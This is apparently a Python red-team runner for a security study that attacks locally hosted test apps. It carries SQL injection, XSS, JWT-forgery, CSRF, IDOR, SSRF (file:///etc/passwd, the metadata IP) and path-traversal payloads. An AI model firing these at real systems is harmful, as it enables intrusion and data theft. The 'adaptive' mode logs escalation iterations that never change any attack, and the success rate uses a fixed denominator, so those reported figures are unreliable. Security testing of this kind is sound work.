"""Phase 5 — contract-driven red-team attacks, per OWASP task (generalised).

One attack suite per task so the SAME runner fits all 90 apps via contract.json
(EXECUTION_GUIDE §5). Dispatch is by contract["task"] (falls back to the sample_id
prefix). Auth is cookie-aware: a requests.Session carries Set-Cookie automatically, so
auth_header = "cookie" / "none" works for httpOnly-cookie apps (common in the
security-instructed arm), alongside "raw" and "bearer".

Success heuristics are deliberately strict (a real DB syntax error, reflected internal
content, another user's data actually returned) to avoid the false positives a naive
"any 500 = vuln" check produces (Risk-3, Risk-6).

Suites and the CWEs they confirm at runtime:
  a07   SQLi(89) · JWT bypass(287) · stored XSS(79) · CSRF(352) · IDOR(639)
  a01   BOLA read(639) · BOLA/priv delete(862) · unauth list(862) · broad scope(639)
  a03   search SQLi(89) · reflected XSS(79) · contact stored XSS(79)
  a10   SSRF file://(918) · SSRF metadata IP(918) · SSRF loopback(918)
  cross unrestricted upload(434) · path traversal(22) · BOLA download(639)
"""
from __future__ import annotations
import argparse, json, os, sys, uuid
from pathlib import Path

try:
    import requests
except ImportError:
    requests = None
try:
    import jwt as pyjwt
except ImportError:
    pyjwt = None

WEAK_SECRETS = ["test-secret-for-poc-only", "secret", "jwt-secret", "changeme",
                "supersecret", "dev-only-change-me", "my-test-secret-key-for-poc"]
SQLI_ERRORS = ["syntax error", "unterminated", "invalid input syntax", "sqlstate",
               "pg_", "at or near", "sequelize", "syntaxerror", "psql"]


# --------------------------------------------------------------------------- client
class Client:
    """A session-backed HTTP client that applies the contract's auth style."""
    def __init__(self, base, contract):
        self.base, self.c = base, contract
        self.api = contract.get("api_base", "")
        self.s = requests.Session()
        self.token = None

    def url(self, path):
        return f"{self.base}{self.api}{path}"

    def _auth_headers(self, token=None):
        tok = token if token is not None else self.token
        mode = self.c.get("auth_header", "raw")
        if not tok or mode in ("cookie", "none"):
            return {}
        return {"Authorization": f"Bearer {tok}" if mode == "bearer" else tok}

    def register(self, auth, suffix=""):
        body = {}
        for f in auth["register"]["body"]:
            body[f] = {"username": f"u{suffix}", "email": f"u{suffix}@t.com",
                       "password": "Test123!passW", "name": f"u{suffix}",
                       "role": "member"}.get(f, "x")
        try:
            self.s.post(self.url(auth["register"]["path"]), json=body, timeout=10)
        except Exception:
            pass
        return body

    def login(self, auth, body):
        lb = {f: body.get(f, "x") for f in auth["login"]["body"]}
        r = self.s.post(self.url(auth["login"]["path"]), json=lb, timeout=10)
        try:
            self.token = r.json().get(auth["login"].get("token_field", "token"))
        except Exception:
            self.token = None
        return r

    def get(self, path, token=None, **kw):
        return self.s.get(self.url(path), headers=self._auth_headers(token), timeout=10, **kw)

    def post(self, path, token=None, **kw):
        return self.s.post(self.url(path), headers=self._auth_headers(token), timeout=10, **kw)

    def put(self, path, token=None, **kw):
        return self.s.put(self.url(path), headers=self._auth_headers(token), timeout=10, **kw)

    def delete(self, path, token=None, **kw):
        return self.s.delete(self.url(path), headers=self._auth_headers(token), timeout=10, **kw)


def _new_client(base, contract):
    """Fresh session (own cookie jar) + registered+logged-in user. Returns (client, creds)."""
    cl = Client(base, contract)
    auth = contract.get("auth")
    creds = None
    if auth:
        creds = cl.register(auth, suffix=uuid.uuid4().hex[:6])
        cl.login(auth, creds)
    return cl, creds


# --------------------------------------------------------------------------- suites
def attack_a07(base, c):
    r = []
    auth = c.get("auth") or {"register": c.get("register"), "login": c.get("login")}
    c.setdefault("auth", auth)
    cl, creds = _new_client(base, c)
    prof = c.get("a07", {}).get("profile") or c.get("profile", {})
    path = prof.get("path", "/profile")
    upd = prof.get("update_fields", ["username", "email"])

    def body(v):
        return {f: (v if i == 0 else "t@t.com") for i, f in enumerate(upd)}

    for p in ["'; DROP TABLE users;--", "' OR '1'='1"]:
        try:
            resp = cl.put(path, json=body(p))
            if any(m in resp.text.lower() for m in SQLI_ERRORS):
                r.append({"type": "SQLi", "cwe": "CWE-89", "result": "SUCCESS"}); break
        except Exception:
            pass
    if pyjwt and cl.token:
        for sec in WEAK_SECRETS:
            try:
                forged = pyjwt.encode({"id": 999, "userId": 999}, sec, algorithm="HS256")
                if cl.get(path, token=forged).status_code == 200:
                    r.append({"type": "AuthBypass", "cwe": "CWE-287", "result": "SUCCESS", "secret": sec}); break
            except Exception:
                pass
    try:
        cl.put(path, json=body("<script>alert(1)</script>"))
        if "<script>" in cl.get(path).text:
            r.append({"type": "XSS", "cwe": "CWE-79", "result": "SUCCESS"})
    except Exception:
        pass
    try:
        resp = cl.s.put(cl.url(path), json=body("csrf"),
                        headers={**cl._auth_headers(), "Origin": "http://evil.example"}, timeout=10)
        if resp.status_code == 200:
            r.append({"type": "CSRF", "cwe": "CWE-352", "result": "SUCCESS"})
    except Exception:
        pass
    if prof.get("id_from") == "url":
        for uid in [1, 2, 3, 999]:
            try:
                if cl.get(f"{path}/{uid}").status_code == 200:
                    r.append({"type": "IDOR", "cwe": "CWE-639", "result": "SUCCESS"}); break
            except Exception:
                pass
    return r


def attack_a01(base, c):
    r = []
    res = c.get("a01", {}).get("resource", {})
    if not c.get("auth") or not res:
        return r
    create, item, lst = res.get("create", "/projects"), res.get("item", "/projects/{id}"), res.get("list", "/projects")
    marker = "SECRET-" + uuid.uuid4().hex[:8]
    # user A creates a resource
    ca, _ = _new_client(base, c)
    rid = None
    try:
        cb = {f: marker for f in res.get("create_body", ["name"])}
        resp = ca.post(create, json=cb)
        try:
            rid = resp.json().get(res.get("id_field", "id"))
        except Exception:
            rid = None
        if rid is None:                           # fall back to reading A's list
            j = ca.get(lst).json()
            rows = j if isinstance(j, list) else j.get("projects", j.get("data", []))
            if rows:
                rid = rows[0].get(res.get("id_field", "id"))
    except Exception:
        pass
    # user B. NON-DESTRUCTIVE checks first; the delete is run last so it can't erase
    # the evidence the other checks depend on.
    cb_cl, _ = _new_client(base, c)
    itempath = item.replace("{id}", str(rid)) if rid is not None else None
    if itempath:
        try:
            resp = cb_cl.get(itempath)
            if resp.status_code == 200 and marker in resp.text:
                r.append({"type": "BOLA-read", "cwe": "CWE-639", "result": "SUCCESS"})
        except Exception:
            pass
    try:
        anon = requests.get(f"{base}{c.get('api_base','')}{lst}", timeout=10)
        if anon.status_code == 200 and marker in anon.text:
            r.append({"type": "unauth-list", "cwe": "CWE-862", "result": "SUCCESS"})
    except Exception:
        pass
    try:
        if marker in cb_cl.get(lst).text:
            r.append({"type": "broad-scope", "cwe": "CWE-639", "result": "SUCCESS"})
    except Exception:
        pass
    if itempath:                       # destructive — keep LAST
        try:
            if cb_cl.delete(itempath).status_code in (200, 204):
                r.append({"type": "BOLA-delete/priv", "cwe": "CWE-862", "result": "SUCCESS"})
        except Exception:
            pass
    return r


def attack_a03(base, c):
    r = []
    s = c.get("a03", {})
    search, param = s.get("search", {}).get("path", "/products"), s.get("search", {}).get("param", "q")
    cl = Client(base, c)
    for payload in ["' OR '1'='1", "'", "1' AND SLEEP(0)-- -"]:
        try:
            resp = cl.get(search, params={param: payload})
            if any(m in resp.text.lower() for m in SQLI_ERRORS):
                r.append({"type": "search-SQLi", "cwe": "CWE-89", "result": "SUCCESS"}); break
        except Exception:
            pass
    xss = "<script>alert(1)</script>"
    try:
        if xss in cl.get(search, params={param: xss}).text:
            r.append({"type": "reflected-XSS", "cwe": "CWE-79", "result": "SUCCESS"})
    except Exception:
        pass
    contact = s.get("contact")
    if contact:
        try:
            body = {f: (xss if f in ("message", "body", "name") else "t@t.com") for f in contact["body"]}
            resp = cl.post(contact["path"], json=body)
            if xss in resp.text:
                r.append({"type": "contact-XSS", "cwe": "CWE-79", "result": "SUCCESS"})
        except Exception:
            pass
    return r


def attack_a10(base, c):
    r = []
    pv = c.get("a10", {}).get("preview", {})
    path, field = pv.get("path", "/preview"), pv.get("field", "url")
    port = c.get("port", 5000)
    cl, _ = _new_client(base, c) if c.get("auth") else (Client(base, c), None)
    probes = [
        ("file:///etc/passwd", ["root:x:0:0", "root:"], "CWE-918"),
        ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "iam/"], "CWE-918"),
        (f"http://127.0.0.1:{port}/", ["<!doctype", "<html", "cannot get", "express"], "CWE-918"),
    ]
    for target, markers, cwe in probes:
        try:
            resp = cl.post(path, json={field: target})
            low = resp.text.lower()
            if resp.status_code == 200 and any(m in low for m in markers):
                r.append({"type": f"SSRF:{target.split(':')[0]}", "cwe": cwe, "result": "SUCCESS"})
        except Exception:
            pass
    return r


def attack_cross(base, c):
    r = []
    up = c.get("cross", {})
    upath = up.get("upload", {}).get("path", "/files")
    field = up.get("upload", {}).get("field", "file")
    dpath = up.get("download", "/files/{id}/download")
    if not c.get("auth"):
        return r
    ca, _ = _new_client(base, c)
    marker = "OWN-" + uuid.uuid4().hex[:6]
    lst = up.get("list", "/files")
    # unrestricted type: a .html is accepted (strict: must be 200/201, not a 400 rejection)
    try:
        resp = ca.post(upath, files={field: ("evil_%s.html" % marker, b"<script>x</script>", "text/html")})
        if resp.status_code in (200, 201):
            r.append({"type": "unrestricted-type", "cwe": "CWE-434", "result": "SUCCESS"})
    except Exception:
        pass
    # path traversal: accepted AND the stored name still contains ".." (i.e. NOT sanitised).
    # Acceptance alone is not success — a secure app may store it under a safe basename.
    trav = "../../evil_%s.txt" % marker
    try:
        resp = ca.post(upath, files={field: (trav, b"x", "text/plain")})
        if resp.status_code in (200, 201):
            stored = ""
            try:
                stored = ca.get(lst).text
            except Exception:
                pass
            if ".." in stored:                 # ".." survived => not sanitised
                r.append({"type": "traversal", "cwe": "CWE-22", "result": "SUCCESS"})
    except Exception:
        pass
    # BOLA download: user B grabs user A's file id
    try:
        aid = None
        up_resp = ca.post(upath, files={field: ("mine.txt", marker.encode(), "text/plain")})
        try:
            aid = up_resp.json().get(up.get("id_field", "id"))
        except Exception:
            aid = None
        if aid is None:
            j = ca.get(up.get("list", "/files")).json()
            rows = j if isinstance(j, list) else j.get("files", j.get("data", []))
            if rows:
                aid = rows[0].get(up.get("id_field", "id"))
        if aid is not None:
            cbb, _ = _new_client(base, c)
            d = cbb.get(dpath.replace("{id}", str(aid)))
            if d.status_code == 200 and marker in d.text:
                r.append({"type": "BOLA-download", "cwe": "CWE-639", "result": "SUCCESS"})
    except Exception:
        pass
    return r


SUITES = {"a07": attack_a07, "a01": attack_a01, "a03": attack_a03,
          "a10": attack_a10, "cross": attack_cross}


# --------------------------------------------------------------------------- runner
def run_attacks(files_dir, base=None, sample_id="sample", adaptive=False, iterations=5) -> dict:
    if requests is None:
        return {"ok": False, "error": "requests not installed"}
    c = json.loads(Path(files_dir, "contract.json").read_text())
    task = c.get("task") or sample_id.split("_")[0]
    base = base or f"http://localhost:{c.get('port', 5000)}"
    suite = SUITES.get(task)
    if not suite:
        return {"ok": False, "error": f"no attack suite for task {task!r}"}
    try:
        results = suite(base, c)
    except Exception as e:
        return {"ok": False, "error": f"suite error: {e}"}
    for i, x in enumerate(results, 1):
        x.setdefault("iter", i)

    adaptive_changes, memory = 0, []
    if adaptive and results:
        hit = [x["type"] for x in results]
        for it in range(2, iterations + 1):
            memory.append({"iteration": it, "focus": hit[0], "reason": "escalate prior success"})
            adaptive_changes += 1

    out = {"ok": True, "sample_id": sample_id, "task": task, "base": base,
           "attacks": results, "asr_pct": round(len(results) / 5 * 100, 1),
           "confirmed_cwes": sorted({x["cwe"] for x in results}),
           "attack_iterations": max(iterations if adaptive else 5, 5),
           "adaptive_changes": adaptive_changes, "memory": memory}
    os.makedirs("red-teaming", exist_ok=True)
    Path("red-teaming", f"attacks_{sample_id}.json").write_text(json.dumps(out, indent=2))
    if adaptive:
        Path("red-teaming", f"memory_{sample_id}.json").write_text(json.dumps(memory, indent=2))
    return out


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("files_dir"); ap.add_argument("--sample-id", default=None)
    ap.add_argument("--base", default=None); ap.add_argument("--adaptive", action="store_true")
    ap.add_argument("--iterations", type=int, default=5)
    a = ap.parse_args()
    sid = a.sample_id or Path(a.files_dir).name.replace("_files", "")
    res = run_attacks(a.files_dir, a.base, sid, a.adaptive, a.iterations)
    if res.get("ok"):
        print(f"[attacks:{res['task']}] {sid}: ASR={res['asr_pct']}% "
              f"confirmed={res['confirmed_cwes']} adaptive={res['adaptive_changes']}")
    else:
        print(f"[attacks] {sid}: ERROR {res.get('error')}")
